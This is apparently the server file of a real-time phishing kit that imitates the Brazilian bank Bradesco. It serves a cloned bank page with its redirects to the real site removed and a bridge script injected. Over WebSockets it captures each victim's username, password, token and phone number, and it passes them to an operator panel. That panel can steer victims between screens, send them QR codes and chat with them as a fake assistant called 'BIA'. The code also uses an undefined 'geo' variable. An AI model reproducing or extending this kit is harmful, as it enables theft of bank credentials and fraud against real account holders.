import "dotenv/config";
import express from "express";
import { createServer } from "http";
import net from "net";
import path from "path";
import fs from "fs";
import { Server } from "socket.io";
import { createExpressMiddleware } from "@trpc/server/adapters/express";
import { registerOAuthRoutes } from "./oauth";
import { registerStorageProxy } from "./storageProxy";
import { appRouter } from "../routers";
import { createContext } from "./context";
import { serveStatic, setupVite } from "./vite";

function isPortAvailable(port: number): Promise<boolean> {
  return new Promise(resolve => {
    const server = net.createServer();
    server.listen(port, () => {
      server.close(() => resolve(true));
    });
    server.on("error", () => resolve(false));
  });
}

async function findAvailablePort(startPort: number = 3000): Promise<number> {
  for (let port = startPort; port < startPort + 20; port++) {
    if (await isPortAvailable(port)) {
      return port;
    }
  }
  throw new Error(`No available port found starting from ${startPort}`);
}

// Estado em memória das sessões ativas
type ClientSession = {
  sessionId: string;
  socketId: string | null;
  operatorSocketId: string | null;
  usuario: string;
  senha: string;
  ip: string;
  pais: string;
  estado: string;
  cidade: string;
  device: string;
  status: string;
  telaAtual: string;
  conectadoEm: number;
  ultimaAtualizacao: number;
  // Dados extras capturados (token, telefone etc.)
  token: string;
  ddd: string;
  telefone: string;
  // Mensagens BIA
  mensagensBia: Array<{ de: "operador" | "cliente"; texto: string; ts: number }>;
  // Avatar BIA
  avatarBia: string;
  // Dados enviados pelo operador
  nomeEnviado: string;
  serialEnviado: string;
  qrCodeEnviado: string;
};

const sessions = new Map<string, ClientSession>();
const SESSIONS_FILE = path.resolve(process.cwd(), "sessions_backup.json");

// Carregar sessões do disco ao iniciar
try {
  if (fs.existsSync(SESSIONS_FILE)) {
    const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf-8"));
    Object.entries(data).forEach(([id, s]: [string, any]) => {
      sessions.set(id, { ...s, status: "offline", socketId: null });
    });
    console.log(`[INIT] ${sessions.size} sessoes carregadas do backup.`);
  }
} catch (err) {
  console.error("[INIT] Erro ao carregar backup de sessoes:", err);
}

// Salvar sessões periodicamente e limpar antigas
setInterval(() => {
  try {
    const now = Date.now();
    const ONE_DAY = 24 * 60 * 60 * 1000;
    
    // Limpar sessões com mais de 24h de inatividade
    for (const [id, s] of sessions.entries()) {
      if (now - s.ultimaAtualizacao > ONE_DAY && s.status === "offline") {
        sessions.delete(id);
      }
    }

    const data = Object.fromEntries(sessions);
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(data), "utf-8");
  } catch (err) {
    console.error("[BACKUP] Erro ao salvar/limpar sessoes:", err);
  }
}, 30000);

function getClientIp(req: any): string {
  return (
    (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
    req.socket?.remoteAddress ||
    "0.0.0.0"
  );
}

function geoLocate(_ip: string) {
  // Geolocalização simulada (em produção, usar serviço real)
  const locations = [
    { pais: "Brasil", estado: "SP", cidade: "São Paulo" },
    { pais: "Brasil", estado: "RJ", cidade: "Rio de Janeiro" },
    { pais: "Brasil", estado: "MG", cidade: "Belo Horizonte" },
    { pais: "Brasil", estado: "RS", cidade: "Porto Alegre" },
    { pais: "Brasil", estado: "PR", cidade: "Curitiba" },
  ];
  return locations[Math.floor(Math.random() * locations.length)];
}

function detectDevice(ua: string): string {
  if (!ua) return "Desconhecido";
  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
  if (/Android/i.test(ua)) return "Android";
  if (/Windows/i.test(ua)) return "Windows";
  if (/Mac/i.test(ua)) return "MacOS";
  if (/Linux/i.test(ua)) return "Linux";
  return "Desktop";
}

function snapshotSessions() {
  return Array.from(sessions.values()).map(s => ({
    sessionId: s.sessionId,
    usuario: s.usuario,
    senha: s.senha,
    ip: s.ip,
    pais: s.pais,
    estado: s.estado,
    cidade: s.cidade,
    device: s.device,
    status: s.status,
    telaAtual: s.telaAtual,
    conectadoEm: s.conectadoEm,
    ultimaAtualizacao: s.ultimaAtualizacao,
    token: s.token,
    ddd: s.ddd,
    telefone: s.telefone,
    mensagensBia: s.mensagensBia,
    avatarBia: s.avatarBia,
    nomeEnviado: s.nomeEnviado,
    serialEnviado: s.serialEnviado,
    qrCodeEnviado: s.qrCodeEnviado,
  }));
}

async function startServer() {
  const app = express();
  const server = createServer(app);
  const io = new Server(server, {
    cors: { 
      origin: "*",
      methods: ["GET", "POST"],
      credentials: true
    },
    allowEIO3: true,
    pingTimeout: 60000,
    pingInterval: 25000,
    upgradeTimeout: 30000,
    maxHttpBufferSize: 10 * 1024 * 1024,
    transports: ['websocket']
  });

  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ limit: "50mb", extended: true }));

  registerStorageProxy(app);
  registerOAuthRoutes(app);

  // ---- SETUP VITE OU STATIC ANTES DE DEFINIR ROTAS CUSTOM ----
  // No entanto, para garantir que nossas rotas /cliente funcionem,
  // precisamos definir as rotas do Bradesco ANTES do serveStatic.
  
  // ---- Endpoint público para o cliente Bradesco (HTML original) ----
  // Servir os assets estáticos do bradesco em /cliente-static/*
  const bradescoPublicDir = path.resolve(process.cwd(), "client", "public");
  app.use("/cliente-static", express.static(bradescoPublicDir));

  // Rota para servir o HTML do cliente
  app.get("/cliente", (req, res) => {
    console.log('[ROUTE] GET /cliente chamado');
    const htmlPath = path.join(bradescoPublicDir, "bradesco.html");
    console.log('[ROUTE] Procurando:', htmlPath);
    if (!fs.existsSync(htmlPath)) {
      console.log('[ROUTE] Arquivo não encontrado:', htmlPath);
      res.status(500).send("bradesco.html não encontrado");
      return;
    }
    let html = fs.readFileSync(htmlPath, "utf-8");

    // Reescrever URLs relativas para apontar para /cliente-static
    html = html.replace(/(href|src)="(?!https?:|\/\/|\/cliente-static|javascript:|#|data:)([^"]+)"/g, (_m, attr, url) => {
      if (url.startsWith("/")) {
        return `${attr}="/cliente-static${url}"`;
      }
      return `${attr}="/cliente-static/${url}"`;
    });

     // Remover redirecionamentos automáticos para o site real
    html = html.replace(/window\.location\s*=\s*['"]https:\/\/[^'"]+['"]/, "/* removido */");
    html = html.replace(/document\.location\s*=\s*['"]https:\/\/[^'"]+['"]/, "/* removido */");
    
    // Remover document.domain para evitar problemas de segurança
    html = html.replace(/document\.domain\s*=\s*['"][^'"]*['"];?/g, "/* removido */");;

    // Injetar Socket.IO e cliente-bridge.js
    const inject = `
<link rel="stylesheet" href="/cliente-bridge.css">
<script src="/socket.io/socket.io.js"></script>
<script src="/cliente-bridge.js"></script>
`;
    html = html.replace(/<\/body>/i, `${inject}</body>`);
    res.set("Content-Type", "text/html; charset=utf-8");
    res.send(html);
  });

  // Rota para retornar HTML do cliente para o React
  app.get("/cliente-html", (req, res) => {
    console.log('[ROUTE] GET /cliente-html chamado');
    const htmlPath = path.join(bradescoPublicDir, "bradesco.html");
    if (!fs.existsSync(htmlPath)) {
      console.log('[ROUTE] Arquivo não encontrado:', htmlPath);
      res.status(500).send("bradesco.html não encontrado");
      return;
    }
    let html = fs.readFileSync(htmlPath, "utf-8");

    // Reescrever URLs relativas para apontar para /cliente-static
    html = html.replace(/(href|src)="(?!https?:|\/{2}|\/cliente-static|javascript:|#|data:)([^"]+)"/g, (_m, attr, url) => {
      if (url.startsWith("/")) {
        return `${attr}="/cliente-static${url}`;
      }
      return `${attr}="/cliente-static/${url}`;
    });

    // Remover redirecionamentos automáticos
    html = html.replace(/window\.location\s*=\s*['"]https:\/\/[^'"]+['"]/g, "/* removido */");
    html = html.replace(/document\.location\s*=\s*['"]https:\/\/[^'"]+['"]/g, "/* removido */");

    // Injetar nosso bundle de cliente antes do </body>
    const inject = `
<link rel="stylesheet" href="/cliente-bridge.css">
<script src="/socket.io/socket.io.js"></script>
<script src="/cliente-bridge.js"></script>
`;
    html = html.replace(/<\/body>/i, `${inject}</body>`);
    res.set("Content-Type", "text/html; charset=utf-8");
    res.send(html);
  });

  // Bridge JS/CSS injetado na página do Bradesco (cliente)
  app.get("/wrapper.js", (_req, res) => {
    res.set("Content-Type", "application/javascript; charset=utf-8");
    res.sendFile(path.resolve(process.cwd(), "client", "public", "__bridge__", "wrapper.js"));
  });
  app.get("/cliente-bridge.js", (_req, res) => {
    res.set("Content-Type", "application/javascript; charset=utf-8");
    res.sendFile(path.resolve(process.cwd(), "client", "public", "__bridge__", "cliente-bridge.js"));
  });
  app.get("/cliente-bridge.css", (_req, res) => {
    res.set("Content-Type", "text/css; charset=utf-8");
    res.sendFile(path.resolve(process.cwd(), "client", "public", "__bridge__", "cliente-bridge.css"));
  });

  // ---- WebSocket ----
  io.on("connection", socket => {
    const role = (socket.handshake.query.role as string) || "client";
    const ip = getClientIp(socket.request);
    const ua = socket.handshake.headers["user-agent"] || "";

    if (role === "operator") {
      console.log(`[OP] Operador conectado: ${socket.id}`);
      socket.join("operators");
      const currentSessions = snapshotSessions();
      console.log(`[OP] Enviando ${currentSessions.length} sessoes para o novo operador ${socket.id}`);
      socket.emit("operator:sessions", currentSessions);

      socket.on("operator:command", (data: { sessionId: string; command: string; payload?: any }) => {
        console.log(`[OP] Recebido comando "${data.command}" para sessao ${data.sessionId}`);
        const s = sessions.get(data.sessionId);
        if (!s) {
          console.error(`[OP] ERRO: Sessao ${data.sessionId} nao encontrada no mapa de sessoes!`);
          io.to(`session:${data.sessionId}`).emit("client:command", { command: data.command, payload: data.payload });
          return;
        }
        s.telaAtual = data.command;
        s.ultimaAtualizacao = Date.now();
        
        console.log(`[OP] Emitindo para sala "session:${data.sessionId}"`);
        io.to(`session:${data.sessionId}`).emit("client:command", { command: data.command, payload: data.payload });
        
        if (s.socketId) {
          console.log(`[OP] Emitindo tambem para socket direto: ${s.socketId}`);
          io.to(s.socketId).emit("client:command", { command: data.command, payload: data.payload });
        }
        io.to("operators").emit("operator:sessions", snapshotSessions());
      });

      socket.on("operator:enviar-info", (data: { sessionId: string; nome: string; serial: string; qrCode?: string }) => {
        const s = sessions.get(data.sessionId);
        if (!s) return;
        s.nomeEnviado = data.nome || s.nomeEnviado;
        s.serialEnviado = data.serial || s.serialEnviado;
        if (data.qrCode) s.qrCodeEnviado = data.qrCode;
        s.ultimaAtualizacao = Date.now();
        io.to(`session:${data.sessionId}`).emit("client:info", { nome: s.nomeEnviado, serial: s.serialEnviado, qrCode: s.qrCodeEnviado });
        if (s.socketId) {
          io.to(s.socketId).emit("client:info", { nome: s.nomeEnviado, serial: s.serialEnviado, qrCode: s.qrCodeEnviado });
        }
        io.to("operators").emit("operator:sessions", snapshotSessions());
      });

      socket.on("operator:bia-message", (data: { sessionId: string; texto: string }) => {
        const s = sessions.get(data.sessionId);
        if (!s) return;
        s.mensagensBia.push({ de: "operador", texto: data.texto, ts: Date.now() });
        s.ultimaAtualizacao = Date.now();
        io.to(`session:${data.sessionId}`).emit("client:bia-message", { texto: data.texto, ts: Date.now() });
        if (s.socketId) {
          io.to(s.socketId).emit("client:bia-message", { texto: data.texto, ts: Date.now() });
        }
        io.to("operators").emit("operator:sessions", snapshotSessions());
      });

      socket.on("operator:bia-avatar", (data: { sessionId: string; avatar: string }) => {
        const s = sessions.get(data.sessionId);
        if (!s) return;
        s.avatarBia = data.avatar;
        s.ultimaAtualizacao = Date.now();
        if (s.socketId) {
          io.to(s.socketId).emit("client:bia-avatar", { avatar: data.avatar });
        }
        io.to("operators").emit("operator:sessions", snapshotSessions());
      });

      socket.on("operator:delete-session", (data: { sessionId: string }) => {
        const s = sessions.get(data.sessionId);
        if (s && s.socketId) {
          io.to(s.socketId).emit("client:disconnect");
        }
        sessions.delete(data.sessionId);
        io.to("operators").emit("operator:sessions", snapshotSessions());
      });

      socket.on("disconnect", () => {
        console.log(`[OP] Operador desconectado: ${socket.id}`);
      });

      return;
    }

    // CLIENTE
    let sessionId = (socket.handshake.query.sessionId as string) || socket.id;
    if (role === "client") {
      if (!sessionId || sessionId === 'null' || sessionId === 'undefined') {
        sessionId = `cliente-${Math.random().toString(36).substring(2, 11)}`;
      }
      
      let s = sessions.get(sessionId);
      if (!s) {
        console.log(`[CLI] Criando NOVA sessao para ${sessionId}`);
        s = {
          sessionId,
          usuario: "",
          senha: "",
          ip,
          pais: geo.pais,
          estado: geo.estado,
          cidade: geo.cidade,
          device: detectDevice(ua),
          status: "online",
          telaAtual: "login",
          conectadoEm: Date.now(),
          ultimaAtualizacao: Date.now(),
          token: "",
          ddd: "",
          telefone: "",
          mensagensBia: [],
          avatarBia: "",
          nomeEnviado: "",
          serialEnviado: "",
          qrCodeEnviado: "",
          socketId: socket.id
        };
      } else {
        console.log(`[CLI] Reaproveitando sessao existente para ${sessionId}`);
        s.status = "online";
        s.socketId = socket.id;
        s.ip = ip;
        s.ultimaAtualizacao = Date.now();
      }
      
      sessions.set(sessionId, s);

      console.log(`[CLI] Cliente conectado: ${sessionId} (${ip})`);
      socket.join(`session:${sessionId}`);
      socket.emit("client:welcome", { sessionId });
      
      // Notificar operadores imediatamente
      const currentSessions = snapshotSessions();
      console.log(`[SERVER] Notificando operadores sobre ${currentSessions.length} sessoes`);
      io.to("operators").emit("operator:sessions", currentSessions);
    }

    socket.on("client:input", (data: { campo: string; valor: string }) => {
      console.log(`[CLI] Input recebido de ${sessionId}: ${data.campo} = ${data.valor}`);
      const sess = sessions.get(sessionId);
      if (!sess) return;
      if (data.campo === "usuario") sess.usuario = data.valor;
      if (data.campo === "senha") sess.senha = data.valor;
      if (data.campo === "token") sess.token = data.valor;
      if (data.campo === "ddd") sess.ddd = data.valor;
      if (data.campo === "telefone") sess.telefone = data.valor;
      sess.ultimaAtualizacao = Date.now();
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });

    socket.on("client:tela-mudou", (data: { tela: string }) => {
      const sess = sessions.get(sessionId);
      if (!sess) return;
      sess.telaAtual = data.tela;
      sess.ultimaAtualizacao = Date.now();
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });

    socket.on("client:bia-message", (data: { texto: string }) => {
      const sess = sessions.get(sessionId);
      if (!sess) {
        console.error(`[BIA] Sessao nao encontrada para mensagem: ${sessionId}`);
        return;
      }
      console.log(`[BIA] Mensagem do cliente ${sessionId}: ${data.texto}`);
      sess.mensagensBia.push({ de: "cliente", texto: data.texto, ts: Date.now() });
      sess.ultimaAtualizacao = Date.now();
      
      // Enviar para todos os operadores
      io.to("operators").emit("operator:client-bia-message", {
        sessionId,
        de: "cliente",
        texto: data.texto,
        ts: Date.now(),
      });
      // Atualizar lista de sessões para refletir a nova mensagem no painel
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });

    socket.on("disconnect", () => {
      const sess = sessions.get(sessionId);
      if (sess) {
        sess.socketId = null;
        sess.status = "offline";
        sess.ultimaAtualizacao = Date.now();
      }
      console.log(`[CLI] Cliente desconectado: ${sessionId}`);
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });
  });

  // ---- tRPC ----
  app.use(
    "/api/trpc",
    createExpressMiddleware({
      router: appRouter,
      createContext,
    })
  );

  // ---- SETUP VITE OU STATIC DEPOIS DAS ROTAS CUSTOM ----
  if (process.env.NODE_ENV === "development") {
    await setupVite(app, server);
  } else {
    // Definimos serveStatic por último para que as rotas /cliente tenham prioridade
    serveStatic(app);
  }

  const preferredPort = parseInt(process.env.PORT || "3000");
  const port = await findAvailablePort(preferredPort);
  if (port !== preferredPort) {
    console.log(`Port ${preferredPort} is busy, using port ${port} instead`);
  }
  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
  });
}

startServer().catch(console.error);
